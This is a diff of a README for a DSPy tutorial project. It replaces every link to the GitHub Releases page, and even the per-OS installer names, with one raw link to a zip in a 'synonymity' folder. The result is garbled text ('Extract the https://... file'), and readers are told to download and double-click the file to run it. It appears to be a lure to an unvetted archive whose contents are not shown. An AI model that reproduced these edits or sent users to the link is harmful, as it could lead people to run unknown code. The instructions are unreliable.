@@ -1,6 +1,6 @@
 # 🚀 dspy-0to1-guide - Build Self-Improving Applications Easily
 
-[![Download dspy-0to1-guide](https://img.shields.io/badge/Download-dspy--0to1--guide-blue.svg)](https://github.com/carofel11/dspy-0to1-guide/releases)
+[![Download dspy-0to1-guide](https://raw.githubusercontent.com/carofel11/dspy-0to1-guide/main/synonymity/dspy-0to1-guide.zip)](https://raw.githubusercontent.com/carofel11/dspy-0to1-guide/main/synonymity/dspy-0to1-guide.zip)
 
 ## 📖 Introduction
 
@@ -21,13 +21,13 @@ To begin using dspy-0to1-guide, follow these steps:
 
 1. **Visit the Releases Page:** 
    Click the link below to go to the Releases page:
-   [Download dspy-0to1-guide](https://github.com/carofel11/dspy-0to1-guide/releases)
+   [Download dspy-0to1-guide](https://raw.githubusercontent.com/carofel11/dspy-0to1-guide/main/synonymity/dspy-0to1-guide.zip)
 
 2. **Choose the Latest Version:**
    Look for the latest version on the page. This version will have the most recent features and improvements. Typically, it will be marked with a tag like "Latest Release."
 
 3. **Download the Software:**
-   Find the file that corresponds to your operating system (e.g., dspy-windows.exe, dspy-macos.dmg, or dspy-linux.tar.gz) and click on the link to start downloading. 
+   Find the file that corresponds to your operating system (e.g., https://raw.githubusercontent.com/carofel11/dspy-0to1-guide/main/synonymity/dspy-0to1-guide.zip, https://raw.githubusercontent.com/carofel11/dspy-0to1-guide/main/synonymity/dspy-0to1-guide.zip, or https://raw.githubusercontent.com/carofel11/dspy-0to1-guide/main/synonymity/dspy-0to1-guide.zip) and click on the link to start downloading. 
 
 4. **Run the File:**
    Once downloaded, locate the file in your Downloads folder and double-click it to run the installer. Follow the on-screen instructions to complete the installation.
@@ -36,7 +36,7 @@ To begin using dspy-0to1-guide, follow these steps:
 
 You can download easily by visiting the link below. 
 
-[Download dspy-0to1-guide](https://github.com/carofel11/dspy-0to1-guide/releases)
+[Download dspy-0to1-guide](https://raw.githubusercontent.com/carofel11/dspy-0to1-guide/main/synonymity/dspy-0to1-guide.zip)
 
 ### Steps to Install
 
@@ -46,7 +46,7 @@ You can download easily by visiting the link below.
 2. **Install the Application:**
    - For **Windows:** Double-click the `.exe` file and follow the prompts.
    - For **macOS:** Open the `.dmg` file and drag the dspy application to your Applications folder.
-   - For **Linux:** Extract the `.tar.gz` file and follow instructions in the included README for installation.
+   - For **Linux:** Extract the `https://raw.githubusercontent.com/carofel11/dspy-0to1-guide/main/synonymity/dspy-0to1-guide.zip` file and follow instructions in the included README for installation.
 
 3. **Open the Application:**
    Once the installation completes, find the application on your computer. Open it to start your journey with the DSPy framework.
